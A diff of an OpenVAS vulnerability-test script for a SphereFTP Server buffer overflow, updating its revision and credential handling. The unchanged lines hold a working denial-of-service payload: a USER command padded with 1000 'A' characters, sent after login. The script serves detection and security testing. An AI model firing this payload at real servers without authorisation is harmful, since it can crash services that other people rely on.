@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_sphere_ftp_server_bof_vuln.nasl 11516 2018-09-21 11:15:17Z asteins $
+# $Id: gb_sphere_ftp_server_bof_vuln.nasl 13494 2019-02-06 10:06:36Z cfischer $
 #
 # SphereFTP Server Buffer Overflow vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:menasoft:sphereftpserver";
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807534");
-  script_version("$Revision: 11516 $");
+  script_version("$Revision: 13494 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-21 13:15:17 +0200 (Fri, 21 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-06 11:06:36 +0100 (Wed, 06 Feb 2019) $");
   script_tag(name:"creation_date", value:"2016-04-04 16:23:30 +0530 (Mon, 04 Apr 2016)");
   script_name("SphereFTP Server Buffer Overflow vulnerability");
 
@@ -68,9 +68,9 @@ if (description)
   script_dependencies("gb_sphere_ftp_server_detect.nasl");
   script_mandatory_keys("SphereFTP Server/installed");
   script_require_ports("Services/ftp", 21);
+
   exit(0);
 }
-
 
 include("ftp_func.inc");
 include("host_details.inc");
@@ -79,20 +79,13 @@ if(!ftpPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-user = get_kb_item("ftp/login");
-if(!user){
-  user = "anonymous";
-}
-
-pass = get_kb_item("ftp/password");
-if(!pass){
-  pass = "anonymous";
-}
+kb_creds = ftp_get_kb_creds();
+user = kb_creds["login"];
+pass = kb_creds["pass"];
 
 soc = open_sock_tcp(ftpPort);
 if(!soc) exit(0);
 
-## Login to the ftp server
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!ftplogin)
 {
@@ -101,8 +94,6 @@ if(!ftplogin)
 }
 
 PAYLOAD = crap(data: "A", length:1000);
-
-## Send specially crafted USER command
 send(socket:soc, data:string("USER", PAYLOAD, '\r\n'));
 
 ftp_close(socket:soc);
